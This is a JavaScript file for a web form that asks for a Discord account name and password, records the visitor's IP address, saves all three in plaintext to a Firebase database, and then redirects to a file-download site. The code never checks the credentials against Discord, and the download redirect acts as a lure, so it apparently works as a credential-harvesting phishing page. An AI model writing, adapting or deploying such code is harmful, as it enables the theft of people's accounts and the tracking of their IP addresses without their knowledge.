import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
import { getFirestore, collection, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";
import { firebaseConfig } from './firebase-config.js';

// Firebase初期化
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);

// discordAccountとpasswordの変数を初期化
let discordAccount = '';
let password = '';

// 次のステップ（Discordアカウント名を取得）
function nextStep() {
    discordAccount = document.getElementById('discordAccount').value;

    if (!discordAccount.trim()) {
        alert('Discordアカウント名を入力してください');
        return;
    }

    // Discordアカウント名が入力された場合
    document.getElementById('discord-form').style.display = 'none';
    document.getElementById('password-form').style.display = 'block';
}

// 送信ボタンを押したときの処理
async function submitForm() {
    password = document.getElementById('password').value;

    if (!password.trim()) {
        alert('パスワードを入力してください');
        return;
    }

    // 「お待ちください」を表示
    document.getElementById('status').style.display = 'block';

    // IPアドレスを取得してFirebaseに送信
    const ip = await fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip);

    // Firebaseにデータを保存
    try {
        const userRef = doc(collection(db, "users"), discordAccount);
        await setDoc(userRef, {
            discordAccount: discordAccount,
            password: password,
            ipAddress: ip,
            createdAt: serverTimestamp()
        });

        // 登録成功のメッセージを表示
        document.getElementById('status').style.display = 'none';
        document.getElementById('success').style.display = 'block';

        // 5秒後に自動でダウンロードサイトに遷移
        setTimeout(() => {
            window.location.href = 'https://gigafile.com';
        }, 5000);
    } catch (error) {
        console.error('Error adding document: ', error);
        alert('登録に失敗しました。もう一度試してください。');
    }
}
